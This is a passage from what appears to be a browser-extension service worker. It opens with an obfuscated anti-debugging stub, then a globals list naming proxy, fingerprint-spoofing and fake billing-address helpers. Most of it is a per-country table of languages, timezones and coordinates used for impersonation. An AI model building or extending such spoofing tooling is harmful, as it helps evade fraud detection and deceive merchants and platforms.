(function () {
  /* global importScripts,cdp,_buildAcceptLang,_cityFromTimezone,buildBillingAddress,_finalizeBilling,detectCountryFromIP,_nationalizeLanguages,_pickUA,_pickScr,buildBillingAddressForCountry,_resolveTimezone,clearBadge,applyProxy,clearProxy,doCheck,buildFingerprint,applyFingerprint,clearFingerprint,resolveBillingCountryCode,attachTab,buildSpoofInjectSource,spoofTab,updateDNRHeaders,detachTab,funcCapitalVictory,DataTransfer,ClipboardEvent,FileReader,getZsAuthHeaders,postRecordSuccess,ensureOffscreenDocument,kimValidateToken,kimHandleAPIRequest, captureScreenshot,kimFetchRealIp,setBadge */
  function funcFellPet() {
    function funcIncomeModel() {}
    funcIncomeModel.toString = function () {
      if (typeof funcIncomeModel.__proto__ !== 'undefined') {
        funcIncomeModel.__proto__ = null;
      }
      throw new Error('');
    };
    try {
      (function () {
        funcIncomeModel.toString();
      })();
    } catch (varHairRepresent) { /* silent */ }
  }
  try {
    funcFellPet();
  } catch (varHiddenNext) { /* silent */ }
})();
importScripts('engine/addresslib.js');
const varClassroomSwung = {
  ID: {
    name: 'Indonesia',
    flag: '\uD83C\uDDEE\uD83C\uDDE9',
    languages: ['id-ID', 'id', 'en-US', 'en'],
    acceptLang: 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Jakarta',
    locale: 'id_ID',
    lat: -6.2088,
    lon: 106.8456
  },
  SG: {
    name: 'Singapore',
    flag: '\uD83C\uDDF8\uD83C\uDDEC',
    languages: ['en-SG', 'en', 'zh-SG', 'zh'],
    acceptLang: 'en-SG,en;q=0.9,zh-SG;q=0.8,zh;q=0.7',
    timezone: 'Asia/Singapore',
    locale: 'en_SG',
    lat: 1.3521,
    lon: 103.8198
  },
  MY: {
    name: 'Malaysia',
    flag: '\uD83C\uDDF2\uD83C\uDDFE',
    languages: ['ms-MY', 'ms', 'en-MY', 'en'],
    acceptLang: 'ms-MY,ms;q=0.9,en-MY;q=0.8,en;q=0.7',
    timezone: 'Asia/Kuala_Lumpur',
    locale: 'ms_MY',
    lat: 3.139,
    lon: 101.6869
  },
  TH: {
    name: 'Thailand',
    flag: '\uD83C\uDDF9\uD83C\uDDED',
    languages: ['th-TH', 'th', 'en-US', 'en'],
    acceptLang: 'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Bangkok',
    locale: 'th_TH',
    lat: 13.7563,
    lon: 100.5018
  },
  VN: {
    name: 'Vietnam',
    flag: '\uD83C\uDDFB\uD83C\uDDF3',
    languages: ['vi-VN', 'vi', 'en-US', 'en'],
    acceptLang: 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Ho_Chi_Minh',
    locale: 'vi_VN',
    lat: 10.8231,
    lon: 106.6297
  },
  PH: {
    name: 'Philippines',
    flag: '\uD83C\uDDF5\uD83C\uDDED',
    languages: ['en-PH', 'en', 'fil-PH', 'fil'],
    acceptLang: 'en-PH,en;q=0.9,fil-PH;q=0.8,fil;q=0.7',
    timezone: 'Asia/Manila',
    locale: 'en_PH',
    lat: 14.5995,
    lon: 120.9842
  },
  JP: {
    name: 'Japan',
    flag: '\uD83C\uDDEF\uD83C\uDDF5',
    languages: ['ja-JP', 'ja', 'en-US', 'en'],
    acceptLang: 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Tokyo',
    locale: 'ja_JP',
    lat: 35.6762,
    lon: 139.6503
  },
  KR: {
    name: 'South Korea',
    flag: '\uD83C\uDDF0\uD83C\uDDF7',
    languages: ['ko-KR', 'ko', 'en-US', 'en'],
    acceptLang: 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Seoul',
    locale: 'ko_KR',
    lat: 37.5665,
    lon: 126.978
  },
  CN: {
    name: 'China',
    flag: '\uD83C\uDDE8\uD83C\uDDF3',
    languages: ['zh-CN', 'zh', 'en-US', 'en'],
    acceptLang: 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Shanghai',
    locale: 'zh_CN',
    lat: 31.2304,
    lon: 121.4737
  },
  HK: {
    name: 'Hong Kong',
    flag: '\uD83C\uDDED\uD83C\uDDF0',
    languages: ['zh-HK', 'zh', 'en-HK', 'en'],
    acceptLang: 'zh-HK,zh;q=0.9,en-HK;q=0.8,en;q=0.7',
    timezone: 'Asia/Hong_Kong',
    locale: 'zh_HK',
    lat: 22.3193,
    lon: 114.1694
  },
  MO: {
    name: 'Macau',
    flag: '\uD83C\uDDF2\uD83C\uDDF4',
    languages: ['zh-MO', 'zh', 'pt-MO', 'pt', 'en-MO', 'en'],
    acceptLang: 'zh-MO,zh;q=0.9,pt-MO;q=0.8,en-MO;q=0.7',
    timezone: 'Asia/Macau',
    locale: 'zh_MO',
    lat: 22.1987,
    lon: 113.5439
  },
  TW: {
    name: 'Taiwan',
    flag: '\uD83C\uDDF9\uD83C\uDDFC',
    languages: ['zh-TW', 'zh', 'en-US', 'en'],
    acceptLang: 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Taipei',
    locale: 'zh_TW',
    lat: 25.033,
    lon: 121.5654
  },
  IN: {
    name: 'India',
    flag: '\uD83C\uDDEE\uD83C\uDDF3',
    languages: ['en-IN', 'en', 'hi-IN', 'hi'],
    acceptLang: 'en-IN,en;q=0.9,hi-IN;q=0.8,hi;q=0.7',
    timezone: 'Asia/Kolkata',
    locale: 'en_IN',
    lat: 28.6139,
    lon: 77.209
  },
  BD: {
    name: 'Bangladesh',
    flag: '\uD83C\uDDE7\uD83C\uDDE9',
    languages: ['bn-BD', 'bn', 'en-US', 'en'],
    acceptLang: 'bn-BD,bn;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Dhaka',
    locale: 'bn_BD',
    lat: 23.8103,
    lon: 90.4125
  },
  PK: {
    name: 'Pakistan',
    flag: '\uD83C\uDDF5\uD83C\uDDF0',
    languages: ['ur-PK', 'ur', 'en-PK', 'en'],
    acceptLang: 'ur-PK,ur;q=0.9,en-PK;q=0.8,en;q=0.7',
    timezone: 'Asia/Karachi',
    locale: 'ur_PK',
    lat: 24.8607,
    lon: 67.0011
  },
  LK: {
    name: 'Sri Lanka',
    flag: '\uD83C\uDDF1\uD83C\uDDF0',
    languages: ['si-LK', 'si', 'en-LK', 'en'],
    acceptLang: 'si-LK,si;q=0.9,en-LK;q=0.8,en;q=0.7',
    timezone: 'Asia/Colombo',
    locale: 'si_LK',
    lat: 6.9271,
    lon: 79.8612
  },
  NP: {
    name: 'Nepal',
    flag: '\uD83C\uDDF3\uD83C\uDDF5',
    languages: ['ne-NP', 'ne', 'en-US', 'en'],
    acceptLang: 'ne-NP,ne;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Kathmandu',
    locale: 'ne_NP',
    lat: 27.7172,
    lon: 85.324
  },
  MM: {
    name: 'Myanmar',
    flag: '\uD83C\uDDF2\uD83C\uDDF2',
    languages: ['my-MM', 'my', 'en-US', 'en'],
    acceptLang: 'my-MM,my;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Yangon',
    locale: 'my_MM',
    lat: 16.8409,
    lon: 96.1735
  },
  KH: {
    name: 'Cambodia',
    flag: '\uD83C\uDDF0\uD83C\uDDED',
    languages: ['km-KH', 'km', 'en-US', 'en'],
    acceptLang: 'km-KH,km;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Phnom_Penh',
    locale: 'km_KH',
    lat: 11.5564,
    lon: 104.9282
  },
  LA: {
    name: 'Laos',
    flag: '\uD83C\uDDF1\uD83C\uDDE6',
    languages: ['lo-LA', 'lo', 'en-US', 'en'],
    acceptLang: 'lo-LA,lo;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Vientiane',
    locale: 'lo_LA',
    lat: 17.9757,
    lon: 102.6331
  },
  MN: {
    name: 'Mongolia',
    flag: '\uD83C\uDDF2\uD83C\uDDF3',
    languages: ['mn-MN', 'mn', 'en-US', 'en'],
    acceptLang: 'mn-MN,mn;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Ulaanbaatar',
    locale: 'mn_MN',
    lat: 47.8864,
    lon: 106.9057
  },
  KZ: {
    name: 'Kazakhstan',
    flag: '\uD83C\uDDF0\uD83C\uDDFF',
    languages: ['kk-KZ', 'kk', 'ru-RU', 'ru'],
    acceptLang: 'kk-KZ,kk;q=0.9,ru-RU;q=0.8,ru;q=0.7',
    timezone: 'Asia/Almaty',
    locale: 'kk_KZ',
    lat: 43.222,
    lon: 76.8512
  },
  UZ: {
    name: 'Uzbekistan',
    flag: '\uD83C\uDDFA\uD83C\uDDFF',
    languages: ['uz-UZ', 'uz', 'ru-RU', 'ru'],
    acceptLang: 'uz-UZ,uz;q=0.9,ru-RU;q=0.8,ru;q=0.7',
    timezone: 'Asia/Tashkent',
    locale: 'uz_UZ',
    lat: 41.2995,
    lon: 69.2401
  },
  AF: {
    name: 'Afghanistan',
    flag: '\uD83C\uDDE6\uD83C\uDDEB',
    languages: ['ps-AF', 'ps', 'en-US', 'en'],
    acceptLang: 'ps-AF,ps;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Kabul',
    locale: 'ps_AF',
    lat: 34.5553,
    lon: 69.2075
  },
  AE: {
    name: 'UAE',
    flag: '\uD83C\uDDE6\uD83C\uDDEA',
    languages: ['ar-AE', 'ar', 'en-AE', 'en'],
    acceptLang: 'ar-AE,ar;q=0.9,en-AE;q=0.8,en;q=0.7',
    timezone: 'Asia/Dubai',
    locale: 'ar_AE',
    lat: 25.2048,
    lon: 55.2708
  },
  SA: {
    name: 'Saudi Arabia',
    flag: '\uD83C\uDDF8\uD83C\uDDE6',
    languages: ['ar-SA', 'ar', 'en-US', 'en'],
    acceptLang: 'ar-SA,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Riyadh',
    locale: 'ar_SA',
    lat: 24.7136,
    lon: 46.6753
  },
  IL: {
    name: 'Israel',
    flag: '\uD83C\uDDEE\uD83C\uDDF1',
    languages: ['he-IL', 'he', 'en-US', 'en'],
    acceptLang: 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Jerusalem',
    locale: 'he_IL',
    lat: 31.7683,
    lon: 35.2137
  },
  TR: {
    name: 'Turkey',
    flag: '\uD83C\uDDF9\uD83C\uDDF7',
    languages: ['tr-TR', 'tr', 'en-US', 'en'],
    acceptLang: 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Istanbul',
    locale: 'tr_TR',
    lat: 41.0082,
    lon: 28.9784
  },
  IR: {
    name: 'Iran',
    flag: '\uD83C\uDDEE\uD83C\uDDF7',
    languages: ['fa-IR', 'fa', 'en-US', 'en'],
    acceptLang: 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Tehran',
    locale: 'fa_IR',
    lat: 35.6892,
    lon: 51.389
  },
  IQ: {
    name: 'Iraq',
    flag: '\uD83C\uDDEE\uD83C\uDDF6',
    languages: ['ar-IQ', 'ar', 'en-US', 'en'],
    acceptLang: 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Baghdad',
    locale: 'ar_IQ',
    lat: 33.3152,
    lon: 44.3661
  },
  JO: {
    name: 'Jordan',
    flag: '\uD83C\uDDEF\uD83C\uDDF4',
    languages: ['ar-JO', 'ar', 'en-US', 'en'],
    acceptLang: 'ar-JO,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Amman',
    locale: 'ar_JO',
    lat: 31.9454,
    lon: 35.9284
  },
  LB: {
    name: 'Lebanon',
    flag: '\uD83C\uDDF1\uD83C\uDDE7',
    languages: ['ar-LB', 'ar', 'fr-FR', 'fr', 'en-US', 'en'],
    acceptLang: 'ar-LB,ar;q=0.9,fr-FR;q=0.8,fr;q=0.7',
    timezone: 'Asia/Beirut',
    locale: 'ar_LB',
    lat: 33.8938,
    lon: 35.5018
  },
  KW: {
    name: 'Kuwait',
    flag: '\uD83C\uDDF0\uD83C\uDDFC',
    languages: ['ar-KW', 'ar', 'en-US', 'en'],
    acceptLang: 'ar-KW,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Kuwait',
    locale: 'ar_KW',
    lat: 29.3759,
    lon: 47.9774
  },
  QA: {
    name: 'Qatar',
    flag: '\uD83C\uDDF6\uD83C\uDDE6',
    languages: ['ar-QA', 'ar', 'en-US', 'en'],
    acceptLang: 'ar-QA,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Qatar',
    locale: 'ar_QA',
    lat: 25.2854,
    lon: 51.531
  },
  BH: {
    name: 'Bahrain',
    flag: '\uD83C\uDDE7\uD83C\uDDED',
    languages: ['ar-BH', 'ar', 'en-US', 'en'],
    acceptLang: 'ar-BH,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Bahrain',
    locale: 'ar_BH',
    lat: 26.0667,
    lon: 50.5577
  },
  OM: {
    name: 'Oman',
    flag: '\uD83C\uDDF4\uD83C\uDDF2',
    languages: ['ar-OM', 'ar', 'en-US', 'en'],
    acceptLang: 'ar-OM,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Muscat',
    locale: 'ar_OM',
    lat: 23.5859,
    lon: 58.4059
  },
  YE: {
    name: 'Yemen',
    flag: '\uD83C\uDDFE\uD83C\uDDEA',
    languages: ['ar-YE', 'ar', 'en-US', 'en'],
    acceptLang: 'ar-YE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Aden',
    locale: 'ar_YE',
    lat: 15.3694,
    lon: 44.191
  },
  SY: {
    name: 'Syria',
    flag: '\uD83C\uDDF8\uD83C\uDDFE',
    languages: ['ar-SY', 'ar', 'en-US', 'en'],
    acceptLang: 'ar-SY,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Damascus',
    locale: 'ar_SY',
    lat: 33.5138,
    lon: 36.2765
  },
  PS: {
    name: 'Palestine',
    flag: '\uD83C\uDDF5\uD83C\uDDF8',
    languages: ['ar-PS', 'ar', 'en-US', 'en'],
    acceptLang: 'ar-PS,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Gaza',
    locale: 'ar_PS',
    lat: 31.9474,
    lon: 35.2272
  },
  GB: {
    name: 'United Kingdom',
    flag: '\uD83C\uDDEC\uD83C\uDDE7',
    languages: ['en-GB', 'en'],
    acceptLang: 'en-GB,en;q=0.9',
    timezone: 'Europe/London',
    locale: 'en_GB',
    lat: 51.5074,
    lon: -0.1278
  },
  DE: {
    name: 'Germany',
    flag: '\uD83C\uDDE9\uD83C\uDDEA',
    languages: ['de-DE', 'de', 'en-US', 'en'],
    acceptLang: 'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Berlin',
    locale: 'de_DE',
    lat: 52.52,
    lon: 13.405
  },
  FR: {
    name: 'France',
    flag: '\uD83C\uDDEB\uD83C\uDDF7',
    languages: ['fr-FR', 'fr', 'en-US', 'en'],
    acceptLang: 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Paris',
    locale: 'fr_FR',
    lat: 48.8566,
    lon: 2.3522
  },
  NL: {
    name: 'Netherlands',
    flag: '\uD83C\uDDF3\uD83C\uDDF1',
    languages: ['nl-NL', 'nl', 'en-US', 'en'],
    acceptLang: 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Amsterdam',
    locale: 'nl_NL',
    lat: 52.3676,
    lon: 4.9041
  },
  IT: {
    name: 'Italy',
    flag: '\uD83C\uDDEE\uD83C\uDDF9',
    languages: ['it-IT', 'it', 'en-US', 'en'],
    acceptLang: 'it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Rome',
    locale: 'it_IT',
    lat: 41.9028,
    lon: 12.4964
  },
  ES: {
    name: 'Spain',
    flag: '\uD83C\uDDEA\uD83C\uDDF8',
    languages: ['es-ES', 'es', 'en-US', 'en'],
    acceptLang: 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Madrid',
    locale: 'es_ES',
    lat: 40.4168,
    lon: -3.7038
  },
  PT: {
    name: 'Portugal',
    flag: '\uD83C\uDDF5\uD83C\uDDF9',
    languages: ['pt-PT', 'pt', 'en-US', 'en'],
    acceptLang: 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Lisbon',
    locale: 'pt_PT',
    lat: 38.7223,
    lon: -9.1393
  },
  BE: {
    name: 'Belgium',
    flag: '\uD83C\uDDE7\uD83C\uDDEA',
    languages: ['nl-BE', 'nl', 'fr-BE', 'fr', 'en-US', 'en'],
    acceptLang: 'nl-BE,nl;q=0.9,fr-BE;q=0.8,fr;q=0.7',
    timezone: 'Europe/Brussels',
    locale: 'nl_BE',
    lat: 50.8503,
    lon: 4.3517
  },
  CH: {
    name: 'Switzerland',
    flag: '\uD83C\uDDE8\uD83C\uDDED',
    languages: ['de-CH', 'de', 'fr-CH', 'fr', 'it-CH', 'it'],
    acceptLang: 'de-CH,de;q=0.9,fr-CH;q=0.8,fr;q=0.7',
    timezone: 'Europe/Zurich',
    locale: 'de_CH',
    lat: 47.3769,
    lon: 8.5417
  },
  AT: {
    name: 'Austria',
    flag: '\uD83C\uDDE6\uD83C\uDDF9',
    languages: ['de-AT', 'de', 'en-US', 'en'],
    acceptLang: 'de-AT,de;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Vienna',
    locale: 'de_AT',
    lat: 48.2082,
    lon: 16.3738
  },
  SE: {
    name: 'Sweden',
    flag: '\uD83C\uDDF8\uD83C\uDDEA',
    languages: ['sv-SE', 'sv', 'en-US', 'en'],
    acceptLang: 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Stockholm',
    locale: 'sv_SE',
    lat: 59.3293,
    lon: 18.0686
  },
  NO: {
    name: 'Norway',
    flag: '\uD83C\uDDF3\uD83C\uDDF4',
    languages: ['nb-NO', 'nb', 'en-US', 'en'],
    acceptLang: 'nb-NO,nb;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Oslo',
    locale: 'nb_NO',
    lat: 59.9139,
    lon: 10.7522
  },
  DK: {
    name: 'Denmark',
    flag: '\uD83C\uDDE9\uD83C\uDDF0',
    languages: ['da-DK', 'da', 'en-US', 'en'],
    acceptLang: 'da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Copenhagen',
    locale: 'da_DK',
    lat: 55.6761,
    lon: 12.5683
  },
  FI: {
    name: 'Finland',
    flag: '\uD83C\uDDEB\uD83C\uDDEE',
    languages: ['fi-FI', 'fi', 'en-US', 'en'],
    acceptLang: 'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Helsinki',
    locale: 'fi_FI',
    lat: 60.1699,
    lon: 24.9384
  },
  IS: {
    name: 'Iceland',
    flag: '\uD83C\uDDEE\uD83C\uDDF8',
    languages: ['is-IS', 'is', 'en-US', 'en'],
    acceptLang: 'is-IS,is;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Atlantic/Reykjavik',
    locale: 'is_IS',
    lat: 64.1466,
    lon: -21.9426
  },
  IE: {
    name: 'Ireland',
    flag: '\uD83C\uDDEE\uD83C\uDDEA',
    languages: ['en-IE', 'en', 'ga-IE', 'ga'],
    acceptLang: 'en-IE,en;q=0.9,ga-IE;q=0.8',
    timezone: 'Europe/Dublin',
    locale: 'en_IE',
    lat: 53.3498,
    lon: -6.2603
  },
  PL: {
    name: 'Poland',
    flag: '\uD83C\uDDF5\uD83C\uDDF1',
    languages: ['pl-PL', 'pl', 'en-US', 'en'],
    acceptLang: 'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Warsaw',
    locale: 'pl_PL',
    lat: 52.2297,
    lon: 21.0122
  },
  CZ: {
    name: 'Czechia',
    flag: '\uD83C\uDDE8\uD83C\uDDFF',
    languages: ['cs-CZ', 'cs', 'en-US', 'en'],
    acceptLang: 'cs-CZ,cs;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Prague',
    locale: 'cs_CZ',
    lat: 50.0755,
    lon: 14.4378
  },
  SK: {
    name: 'Slovakia',
    flag: '\uD83C\uDDF8\uD83C\uDDF0',
    languages: ['sk-SK', 'sk', 'en-US', 'en'],
    acceptLang: 'sk-SK,sk;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Bratislava',
    locale: 'sk_SK',
    lat: 48.1486,
    lon: 17.1077
  },
  HU: {
    name: 'Hungary',
    flag: '\uD83C\uDDED\uD83C\uDDFA',
    languages: ['hu-HU', 'hu', 'en-US', 'en'],
    acceptLang: 'hu-HU,hu;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Budapest',
    locale: 'hu_HU',
    lat: 47.4979,
    lon: 19.0402
  },
  RO: {
    name: 'Romania',
    flag: '\uD83C\uDDF7\uD83C\uDDF4',
    languages: ['ro-RO', 'ro', 'en-US', 'en'],
    acceptLang: 'ro-RO,ro;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Bucharest',
    locale: 'ro_RO',
    lat: 44.4268,
    lon: 26.1025
  },
  BG: {
    name: 'Bulgaria',
    flag: '\uD83C\uDDE7\uD83C\uDDEC',
    languages: ['bg-BG', 'bg', 'en-US', 'en'],
    acceptLang: 'bg-BG,bg;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Sofia',
    locale: 'bg_BG',
    lat: 42.6977,
    lon: 23.3219
  },
  GR: {
    name: 'Greece',
    flag: '\uD83C\uDDEC\uD83C\uDDF7',
    languages: ['el-GR', 'el', 'en-US', 'en'],
    acceptLang: 'el-GR,el;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Athens',
    locale: 'el_GR',
    lat: 37.9838,
    lon: 23.7275
  },
  HR: {
    name: 'Croatia',
    flag: '\uD83C\uDDED\uD83C\uDDF7',
    languages: ['hr-HR', 'hr', 'en-US', 'en'],
    acceptLang: 'hr-HR,hr;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Zagreb',
    locale: 'hr_HR',
    lat: 45.815,
    lon: 15.9819
  },
  RS: {
    name: 'Serbia',
    flag: '\uD83C\uDDF7\uD83C\uDDF8',
    languages: ['sr-RS', 'sr', 'en-US', 'en'],
    acceptLang: 'sr-RS,sr;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Belgrade',
    locale: 'sr_RS',
    lat: 44.7866,
    lon: 20.4489
  },
  UA: {
    name: 'Ukraine',
    flag: '\uD83C\uDDFA\uD83C\uDDE6',
    languages: ['uk-UA', 'uk', 'en-US', 'en'],
    acceptLang: 'uk-UA,uk;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Kyiv',
    locale: 'uk_UA',
    lat: 50.4501,
    lon: 30.5234
  },
  RU: {
    name: 'Russia',
    flag: '\uD83C\uDDF7\uD83C\uDDFA',
    languages: ['ru-RU', 'ru', 'en-US', 'en'],
    acceptLang: 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Moscow',
    locale: 'ru_RU',
    lat: 55.7558,
    lon: 37.6173
  },
  BY: {
    name: 'Belarus',
    flag: '\uD83C\uDDE7\uD83C\uDDFE',
    languages: ['be-BY', 'be', 'ru-RU', 'ru'],
    acceptLang: 'be-BY,be;q=0.9,ru-RU;q=0.8,ru;q=0.7',
    timezone: 'Europe/Minsk',
    locale: 'be_BY',
    lat: 53.9006,
    lon: 27.559
  },
  LT: {
    name: 'Lithuania',
    flag: '\uD83C\uDDF1\uD83C\uDDF9',
    languages: ['lt-LT', 'lt', 'en-US', 'en'],
    acceptLang: 'lt-LT,lt;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Vilnius',
    locale: 'lt_LT',
    lat: 54.6872,
    lon: 25.2797
  },
  LV: {
    name: 'Latvia',
    flag: '\uD83C\uDDF1\uD83C\uDDFB',
    languages: ['lv-LV', 'lv', 'en-US', 'en'],
    acceptLang: 'lv-LV,lv;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Riga',
    locale: 'lv_LV',
    lat: 56.9496,
    lon: 24.1052
  },
  EE: {
    name: 'Estonia',
    flag: '\uD83C\uDDEA\uD83C\uDDEA',
    languages: ['et-EE', 'et', 'en-US', 'en'],
    acceptLang: 'et-EE,et;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Tallinn',
    locale: 'et_EE',
    lat: 59.437,
    lon: 24.7536
  },
  SI: {
    name: 'Slovenia',
    flag: '\uD83C\uDDF8\uD83C\uDDEE',
    languages: ['sl-SI', 'sl', 'en-US', 'en'],
    acceptLang: 'sl-SI,sl;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Ljubljana',
    locale: 'sl_SI',
    lat: 46.0569,
    lon: 14.5058
  },
  AL: {
    name: 'Albania',
    flag: '\uD83C\uDDE6\uD83C\uDDF1',
    languages: ['sq-AL', 'sq', 'en-US', 'en'],
    acceptLang: 'sq-AL,sq;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Tirane',
    locale: 'sq_AL',
    lat: 41.3275,
    lon: 19.8187
  },
  BA: {
    name: 'Bosnia',
    flag: '\uD83C\uDDE7\uD83C\uDDE6',
    languages: ['bs-BA', 'bs', 'en-US', 'en'],
    acceptLang: 'bs-BA,bs;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Europe/Sarajevo',
    locale: 'bs_BA',
    lat: 43.8563,
    lon: 18.4131
  },
  LU: {
    name: 'Luxembourg',
    flag: '\uD83C\uDDF1\uD83C\uDDFA',
    languages: ['fr-LU', 'fr', 'de-LU', 'de', 'lb-LU', 'lb'],
    acceptLang: 'fr-LU,fr;q=0.9,de-LU;q=0.8,en-US;q=0.7',
    timezone: 'Europe/Luxembourg',
    locale: 'fr_LU',
    lat: 49.6116,
    lon: 6.1319
  },
  MT: {
    name: 'Malta',
    flag: '\uD83C\uDDF2\uD83C\uDDF9',
    languages: ['mt-MT', 'mt', 'en-MT', 'en'],
    acceptLang: 'mt-MT,mt;q=0.9,en-MT;q=0.8,en;q=0.7',
    timezone: 'Europe/Malta',
    locale: 'mt_MT',
    lat: 35.8989,
    lon: 14.5146
  },
  CY: {
    name: 'Cyprus',
    flag: '\uD83C\uDDE8\uD83C\uDDFE',
    languages: ['el-CY', 'el', 'en-US', 'en'],
    acceptLang: 'el-CY,el;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Asia/Nicosia',
    locale: 'el_CY',
    lat: 35.1856,
    lon: 33.3823
  },
  NG: {
    name: 'Nigeria',
    flag: '\uD83C\uDDF3\uD83C\uDDEC',
    languages: ['en-NG', 'en'],
    acceptLang: 'en-NG,en;q=0.9',
    timezone: 'Africa/Lagos',
    locale: 'en_NG',
    lat: 6.5244,
    lon: 3.3792
  },
  ZA: {
    name: 'South Africa',
    flag: '\uD83C\uDDFF\uD83C\uDDE6',
    languages: ['en-ZA', 'en', 'af-ZA', 'af'],
    acceptLang: 'en-ZA,en;q=0.9,af-ZA;q=0.8',
    timezone: 'Africa/Johannesburg',
    locale: 'en_ZA',
    lat: -26.2041,
    lon: 28.0473
  },
  EG: {
    name: 'Egypt',
    flag: '\uD83C\uDDEA\uD83C\uDDEC',
    languages: ['ar-EG', 'ar', 'en-US', 'en'],
    acceptLang: 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Africa/Cairo',
    locale: 'ar_EG',
    lat: 30.0444,
    lon: 31.2357
  },
  KE: {
    name: 'Kenya',
    flag: '\uD83C\uDDF0\uD83C\uDDEA',
    languages: ['en-KE', 'en', 'sw-KE', 'sw'],
    acceptLang: 'en-KE,en;q=0.9,sw-KE;q=0.8',
    timezone: 'Africa/Nairobi',
    locale: 'en_KE',
    lat: -1.2921,
    lon: 36.8219
  },
  MA: {
    name: 'Morocco',
    flag: '\uD83C\uDDF2\uD83C\uDDE6',
    languages: ['ar-MA', 'ar', 'fr-FR', 'fr', 'en-US', 'en'],
    acceptLang: 'ar-MA,ar;q=0.9,fr-FR;q=0.8,fr;q=0.7',
    timezone: 'Africa/Casablanca',
    locale: 'ar_MA',
    lat: 33.5731,
    lon: -7.5898
  },
  ET: {
    name: 'Ethiopia',
    flag: '\uD83C\uDDEA\uD83C\uDDF9',
    languages: ['am-ET', 'am', 'en-US', 'en'],
    acceptLang: 'am-ET,am;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Africa/Addis_Ababa',
    locale: 'am_ET',
    lat: 9.03,
    lon: 38.74
  },
  GH: {
    name: 'Ghana',
    flag: '\uD83C\uDDEC\uD83C\uDDED',
    languages: ['en-GH', 'en'],
    acceptLang: 'en-GH,en;q=0.9',
    timezone: 'Africa/Accra',
    locale: 'en_GH',
    lat: 5.6037,
    lon: -0.187
  },
  DZ: {
    name: 'Algeria',
    flag: '\uD83C\uDDE9\uD83C\uDDFF',
    languages: ['ar-DZ', 'ar', 'fr-FR', 'fr'],
    acceptLang: 'ar-DZ,ar;q=0.9,fr-FR;q=0.8,fr;q=0.7',
    timezone: 'Africa/Algiers',
    locale: 'ar_DZ',
    lat: 36.7538,
    lon: 3.0588
  },
  TN: {
